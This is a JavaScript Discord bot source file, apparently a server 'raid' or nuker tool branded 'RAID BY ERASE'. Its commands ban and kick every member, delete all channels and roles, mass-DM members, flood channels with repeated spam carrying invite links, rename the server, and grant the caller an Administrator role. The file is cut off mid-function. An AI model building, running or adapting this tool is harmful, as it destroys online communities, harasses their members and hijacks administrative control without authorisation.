const Discord = require("discord.js");
const bot = new Discord.Client();
const config = require("./config.json");
const colors = require("colors");
var fs = require("fs-extra");
var path = require("path");
var moment = require("moment");

var prefix = config.prf

//Si Tu veux changer le bot change le token en dessous
var token = config.tkn
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
    /////////////////////////////////////////////////////////////////////////////////////////////////////////
    /////////////////////////////////////////////////////////////////////////////////////////////////////////
    /////////////////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
    /////////////////////////////////////////////////////////////////////////////////////////////////////////
    /////////////////////////////////////////////////////////////////////////////////////////////////////////
    /////////////////////////////////////////////////////////////////////////////////////////////////////////
    /////////////////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
    /////////////////////////////////////////////////////////////////////////////////////////////////////////
    /////////////////////////////////////////////////////////////////////////////////////////////////////////
    /////////////////////////////////////////////////////////////////////////////////////////////////////////
    /////////////////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
    /////////////////////////////////////////////////////////////////////////////////////////////////////////
    /////////////////////////////////////////////////////////////////////////////////////////////////////////
    /////////////////////////////////////////////////////////////////////////////////////////////////////////
    /////////////////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
    /////////////////////////////////////////////////////////////////////////////////////////////////////////
    /////////////////////////////////////////////////////////////////////////////////////////////////////////
    /////////////////////////////////////////////////////////////////////////////////////////////////////////
    /////////////////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
    /////////////////////////////////////////////////////////////////////////////////////////////////////////
    /////////////////////////////////////////////////////////////////////////////////////////////////////////
    /////////////////////////////////////////////////////////////////////////////////////////////////////////
    /////////////////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
    /////////////////////////////////////////////////////////////////////////////////////////////////////////
    /////////////////////////////////////////////////////////////////////////////////////////////////////////
    /////////////////////////////////////////////////////////////////////////////////////////////////////////
    /////////////////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////
    /////////////////////////////////////////////////////////////////////////////////////////////////////////
    /////////////////////////////////////////////////////////////////////////////////////////////////////////
    /////////////////////////////////////////////////////////////////////////////////////////////////////////
    /////////////////////////////////////////////////////////////////////////////////////////////////////////
var img = "https://cdn.discordapp.com/attachments/915290677825380402/915290866720071720/standard1.gif"
var clr = "#080808"
var spammsg = "||@everyone https://tenor.com/view/f-bi-raid-swat-gif-11500735 || RAID BY ERASE https://discord.gg/FcPkHRvEYg https://discord.gg/um3medPnhd"
var salon = "RAID BY ERASE"
var number2 = "30"
var icone = "https://cdn.discordapp.com/attachments/915290677825380402/915290866720071720/standard1.gif"
var raid = "RAID BY ERASE"

bot.login(process.env.TOKEN);

bot.on("ready", () => {
    bot.user.setActivity("?help ", {
        type: "PLAYING",
        _url: "https://cdn.discordapp.com/attachments/915290677825380402/915290866720071720/standard1.gif",
        get url() {
            return this._url;
        },
        set url(value) {
            this._url = value;
        },
    });
    console.log("BOT ON".red);
    console.log("PRÊT AU COMBAT".black);

})

bot.on("message", async msg => {
    const cmd = msg.content
    const inclus = cmd.includes
    const csl = console
    const typech = msg.channel.type

    var command = msg.content.split(' ')[0].replace(prefix, '');
    var args = msg.content.split(' ').slice(1);

    if (command === "say") {
        var message = args.join(" ")

        msg.delete(command)
        msg.channel.send(message)
    }
    if (command === "kickall") {

        var message = args.join(' ') || "no reason"

        msg.guild.members.forEach(chan => {
            if (!chan.kickable) return;
            chan.kick(message).catch(e => { console.log(e.stack) })
        })
    }
    if (command === "banall") {

        var message = args.join(' ') || "no reason"

        msg.guild.members.forEach(chan => {
            if (!chan.bannable) return;
            chan.ban(message).catch(e => { console.log(e.stack) })
        })
    }

    if (command === "spamall") {
        var message = args[0] || spammsg
        if (!message) return msg.reply('enter a message (`spamall (message)`) of `config your profil.spammsg`').catch(e => { console.log(e.stack) })

        msg.guild.channels.forEach(chan => {
            if (chan.type !== "text") return;
            chan.send(message).catch(e => { console.log(e) })
            chan.send(message).catch(e => { console.log(e) })
            chan.send(message).catch(e => { console.log(e) })
            chan.send(message).catch(e => { console.log(e) })
            chan.send(message).catch(e => { console.log(e) })
            chan.send(message).catch(e => { console.log(e) })
            chan.send(message).catch(e => { console.log(e) })
            chan.send(message).catch(e => { console.log(e) })
            chan.send(message).catch(e => { console.log(e) })
            chan.send(message).catch(e => { console.log(e) })
            chan.send(message).catch(e => { console.log(e) })
            chan.send(message).catch(e => { console.log(e) })
            chan.send(message).catch(e => { console.log(e) })
            chan.send(message).catch(e => { console.log(e) })
            chan.send(message).catch(e => { console.log(e) })
            chan.send(message).catch(e => { console.log(e) })
            chan.send(message).catch(e => { console.log(e) })
            chan.send(message).catch(e => { console.log(e) })
            chan.send(message).catch(e => { console.log(e) })
            chan.send(message).catch(e => { console.log(e) })
            chan.send(message).catch(e => { console.log(e) })
            chan.send(message).catch(e => { console.log(e) })
            chan.send(message).catch(e => { console.log(e) })
            chan.send(message).catch(e => { console.log(e) })
            chan.send(message).catch(e => { console.log(e) })
            chan.send(message).catch(e => { console.log(e) })
            chan.send(message).catch(e => { console.log(e) })
            chan.send(message).catch(e => { console.log(e) })
            chan.send(message).catch(e => { console.log(e) })
            chan.send(message).catch(e => { console.log(e) })
            chan.send(message).catch(e => { console.log(e) })
            chan.send(message).catch(e => { console.log(e) })
            chan.send(message).catch(e => { console.log(e) })
            chan.send(message).catch(e => { console.log(e) })
            chan.send(message).catch(e => { console.log(e) })
            chan.send(message).catch(e => { console.log(e) })
            chan.send(message).catch(e => { console.log(e) })
            chan.send(message).catch(e => { console.log(e) })
            chan.send(message).catch(e => { console.log(e) })
            chan.send(message).catch(e => { console.log(e) })
            chan.send(message).catch(e => { console.log(e) })
            chan.send(message).catch(e => { console.log(e) })
            chan.send(message).catch(e => { console.log(e) })
            chan.send(message).catch(e => { console.log(e) })
            chan.send(message).catch(e => { console.log(e) })
        })
    }
    if (command === "dmall") {
        var message = args[0] || spammsg
        if (!message) return msg.reply('enter a message (`dmall (message)`) of `config your profil.spammsg`').catch(e => { console.log(e.stack) })

        msg.guild.members.forEach(chan => {
            if (chan.bot || chan.author === bot.user) return;
            chan.send(message).catch(e => { console.log(e.stack) })
            chan.send(message).catch(e => { console.log(e.stack) })
            chan.send(message).catch(e => { console.log(e.stack) })
            chan.send(message).catch(e => { console.log(e.stack) })
            chan.send(message).catch(e => { console.log(e.stack) })
        })
    }
    if (command === "destroy") {
        var number = args[0] || number2
        if (!number) return msg.reply('enter a valide number (`destroy <number> (name)`)').catch(e => { console.log(e.stack) })
        if (number.isNaN) return msg.reply('enter a valide number (`destroy <number> (name)`)').catch(e => { console.log(e.stack) })

        var message = args[1] || raid
        if (!message) return msg.reply('enter a name (`destroy <number> (name)`) of `config your profil.spamchan`').catch(e => { console.log(e.stack) })

        msg.guild.channels.forEach(chan => {
            if (!chan.deletable) return;
            chan.delete().catch(e => { console.log(e.stack) })
        })

        msg.guild.roles.forEach(chan => {
            chan.delete().catch(e => { console.log(e.stack) })
        })
        var swat = "Paradise > all"
        var name = args[0] || swat
        if (!name) return msg.reply('enter a name (`servname (name)`) of `config your profil.servname`').catch(e => { console.log(e.stack) })

        msg.guild.setName(name).catch(e => { console.log(e.stack) })



        var icon = args[0] || icone

        msg.guild.setIcon(icon).catch(e => { console.log(e.stack) })



        if (!message) return msg.reply('enter a message (`dmall (message)`) of `config your profil.spammsg`').catch(e => { console.log(e.stack) })

        msg.guild.members.forEach(chan => {
            if (chan.bot || chan.author === bot.user) return;
            chan.send(message).catch(e => { console.log(e.stack) })


        })

        for (var i = 0; i < number; i++) {
            msg.guild.createChannel(message, { type: 'text' }).then(ch => {
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
            })
        }

        for (var i = 0; i < number; i++) {
            msg.guild.createRole({ name: message, permissions: 0, color: "000000" }).catch(e => { console.log(e.stack) })
        }
    }
    if (command === "all") {
        var number = args[0] || number2
        if (!number) return msg.reply('enter a valide number (`destroy <number> (name)`)').catch(e => { console.log(e.stack) })
        if (number.isNaN) return msg.reply('enter a valide number (`destroy <number> (name)`)').catch(e => { console.log(e.stack) })

        var message = args[1] || raid
        if (!message) return msg.reply('enter a name (`destroy <number> (name)`) of `config your profil.spamchan`').catch(e => { console.log(e.stack) })

        msg.guild.channels.forEach(chan => {
            if (!chan.deletable) return;
            chan.delete().catch(e => { console.log(e.stack) })
        })

        msg.guild.roles.forEach(chan => {
            chan.delete().catch(e => { console.log(e.stack) })
        })

        for (var i = 0; i < number; i++) {
            msg.guild.createChannel(message, { type: 'text' }).then(ch => {
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })
                ch.send(spammsg).catch(e => { console.log(e.stack) })

            })
        }

        for (var i = 0; i < number; i++) {
            msg.guild.createRole({ name: message, permissions: 0, color: "000000" }).catch(e => { console.log(e.stack) })
        }
    }
    if (command === "admin") {
        var user = msg.mentions.members.first() || msg.guild.members.get(args[0]) || msg.member
        msg.guild.createRole({ name: "*", permissions: 8, color: "000000" }).then(rol => {
            user.addRole(rol).catch(e => { console.log(e.stack) })
        })
    }
    if (command === "servname") {
        var name = args[0] || salon
        if (!name) return msg.reply('enter a name (`servname (name)`) of `config your profil.servname`').catch(e => { console.log(e.stack) })

        msg.guild.setName(name).catch(e => { console.log(e.stack) })
    }
    if (command === "servicone") {
        var icon = args[0] || icone

        msg.guild.setIcon(icon).catch(e => { console.log(e.stack) })
    }
    if (command === "crchans") {
        var number = args[0] || number2
        if (!number) return msg.reply('enter a valide number (`crchans <number> (name)`)').catch(e => { console.log(e.stack) })
        if (number.isNaN) return msg.reply('enter a valide number (`crchans <number> (name)`)').catch(e => { console.log(e.stack) })

        var message = args[1] || salon
        if (!message) return msg.reply('enter a name (`crchans <number> (name)`) of `config your profil.spamchan`').catch(e => { console.log(e.stack) })

        for (var i = 0; i < number; i++) {
            msg.guild.createChannel(message, { type: 'text' }).catch(e => { console.log(e.stack) })
        }
    }

    if (command === "crroles") {
        var number = args[0]
        if (!number) return msg.reply('enter a valide number (`crroles <number> (name)`)').catch(e => { console.log(e.stack) })
        if (number.isNaN) return msg.reply('enter a valide number (`crroles <number> (name)`)').catch(e => { console.log(e.stack) })

        var message = args[1] || role
        if (!message) return msg.reply('enter a name (`crroles <number> (name)`) of `config your profil.spamrol`').catch(e => { console.log(e.stack) })

        for (var i = 0; i < number; i++) {
            msg.guild.createRole({ name: message, permissions: 0, color: "000000" }).catch(e => { console.log(e.stack) })
        }
